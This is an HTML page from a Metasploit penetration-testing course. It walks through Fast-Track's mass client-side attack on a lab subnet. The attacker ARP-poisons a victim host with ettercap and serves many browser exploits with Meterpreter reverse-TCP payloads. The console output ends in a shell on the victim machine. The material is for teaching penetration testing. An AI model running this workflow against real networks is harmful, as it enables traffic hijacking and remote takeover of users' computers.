<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Mass-Client Attack</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Mass-Client
Attack</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Fast-Track's 'Mass Client-Side Attack'
is similar in nature to
Metasploit's db_autopwn. When a user connects to your malicious
website, a slew of both custom exploits developed in Fast-Track and the
army of exploits in Metasploit's repository will be launched at the
client. One thing to add is that you can also use ARP cache poisoning
with ettercap in order to force the victim to your site! Let's try this
out.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">Fast-Track Main Menu:<br><br>        1.  Fast-Track Updates<br>        2.  Autopwn Automation<br>        3.  Nmap Scripting Engine<br>        4.  Microsoft SQL Tools<br>        5.  Mass Client-Side Attack<br>        6.  Exploits<br>        7.  Binary to Hex Payload Converter<br>        8.  Payload Generator<br>        9.  Fast-Track Tutorials<br>        10. Fast-Track Changelog<br>        11. Fast-Track Credits<br>        12. Exit Fast-Track<br><br>        Enter the number: 5<br><br><br>        Mass Client Client Attack<br><br>        Requirements: PExpect<br><br>        Metasploit has a bunch of powerful client-side attacks available in<br>        its arsenal. This simply launches all client side attacks within<br>        Metasploit through msfcli and starts them on various ports<br>        and starts a custom HTTP server for you, injects a new index.html<br>        file, and puts all of the exploits in iframes.<br><br>        If you can get someone to connect to this web page, it will basically<br>        brute force various client side exploits in the hope one succeeds.<br>        You'll have to monitor each shell if one succeeds.. Once finished,<br>        just have someone connect to port 80 for you and if they are vulnerable<br>        to any of the exploits...should have a nice shell.<br><br>        -c to Cancel<br><br>    Enter the IP Address to listen on: 10.211.55.130<br><br>Specify your payload:<br><br>1. Windows Meterpreter Reverse Meterpreter<br>2. Generic Bind Shell<br>3. Windows VNC Inject Reverse_TCP (aka "Da Gui")<br>4. Reverse TCP Shell<br><br>Enter the number of the payload you want: 1<br><br>Would you like to use ettercap to ARP poison a host yes or no: yes<br><br>Ettercap allows you to ARP poison a specific host and when they browse<br>a site, force them to use the metasploit site and launch a slew of<br>exploits from the Metasploit repository. ETTERCAP REQUIRED.<br><br><br>What IP Address do you want to poison: 10.211.55.128<br>Setting up the ettercap filters....<br>Filter created...<br>Compiling Ettercap filter...<br><br>etterfilter NG-0.7.3 copyright 2001-2004 ALoR &amp; NaGA<br><br><br>12 protocol tables loaded:<br>DECODED DATA udp tcp gre icmp ip arp wifi fddi tr eth<br><br>11 constants loaded:<br>VRRP OSPF GRE UDP TCP ICMP6 ICMP PPTP PPPoE IP ARP<br><br>Parsing source file 'bin/appdata/fasttrack.filter' done.<br><br>Unfolding the meta-tree done.<br><br>Converting labels to real offsets done.<br><br>Writing output to 'bin/appdata/fasttrack.ef' done.<br><br>-&gt; Script encoded into 16 instructions.<br><br>Filter compiled...Running Ettercap and poisoning target...<br>Setting up Metasploit MSFConsole with various exploits...<br>If an exploit succeeds, type sessions -l to list shells and sessions -i<br>to interact...<br><br><br>Have someone connect to you on port 80...<br><br>Launching MSFConsole and Exploits...<br><br>Once you see the Metasploit Console launch all the exploits have someone<br>connect to you..<br>SRVPORT =&gt; 8072<br>resource&gt; set URIPATH /<br>URIPATH =&gt; /<br>resource&gt; set LPORT 9072<br>LPORT =&gt; 9072<br>resource&gt; exploit<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Exploit running as background job.<br>resource&gt; use exploit/windows/browser/zenturiprogramchecker_unsafe<br>[*] Started reverse handler<br>resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>[*] Using URL: http://0.0.0.0:8071/<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource&gt; set LHOST 10.211.55.130<br>LHOST =&gt; 10.211.55.130<br>[*] Local IP: http://10.211.55.130:8071/<br>resource&gt; set SRVPORT 8073<br>[*] Server started.<br>SRVPORT =&gt; 8073<br>resource&gt; set URIPATH /<br>URIPATH =&gt; /<br>resource&gt; set LPORT 9073<br>LPORT =&gt; 9073<br>resource&gt; exploit<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Exploit running as background job.<br>[*] Using URL: http://0.0.0.0:8072/<br>[*] Local IP: http://10.211.55.130:8072/<br>[*] Server started.<br>msf exploit(zenturiprogramchecker_unsafe) &gt;<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Using URL: http://0.0.0.0:8073/<br>[*] Local IP: http://10.211.55.130:8073/<br>[*] Server started.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">At this point when our poor victim
at 10.211.55.128 goes to browse
ANY website, all the hrefs will be replaced with our website address.
Check it out below.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Victims_browser.jpg"
 class="image"><img alt="Victims browser.jpg"
 src="http://www.offensive-security.com/w/images/7/7f/Victims_browser.jpg"
 width="1440" height="873"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Notice in the bottom left hand corner that the link points to our
malicious website on 10.211.55.130. All of the links on Google have
successfully been replaced. As soon as a link is clicked, the mayhem
begins.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">[*] Local IP: http://10.211.55.130:8071/<br>[*] Server started.<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Exploit running as background job.<br>[*] Using URL: http://0.0.0.0:8072/<br>[*] Local IP: http://10.211.55.130:8072/<br>[*] Server started.<br>msf exploit(zenturiprogramchecker_unsafe) &gt;<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Using URL: http://0.0.0.0:8073/<br>[*] Local IP: http://10.211.55.130:8073/<br>[*] Server started.<br>[*] Sending Adobe Collab.getIcon() Buffer Overflow to 10.211.55.128:1044...<br>[*] Attempting to exploit ani_loadimage_chunksize<br>[*] Sending HTML page to 10.211.55.128:1047...<br>[*] Sending Adobe JBIG2Decode Memory Corruption Exploit to 10.211.55.128:1046...<br>[*] Sending exploit to 10.211.55.128:1049...<br>[*] Attempting to exploit ani_loadimage_chunksize<br>[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 10.211.55.128:1076...<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (10.211.55.130:9007 -&gt; 10.211.55.128:1077<br>msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>Id Description Tunnel<br>-- ----------- ------<br>1 Meterpreter 10.211.55.130:9007 -&gt; 10.211.55.128:1077<br><br>msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Note that ARP cache poisoning will
only work on systems in the same
subnet as you. This was a great example of how to "force" a user to
browse to your site instead of having to entice them to click on a link
and automatically exploit them with a variety of attacks.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Fast-Track"
 title="Fast-Track">Fast-Track</a></div>
</body>
</html>
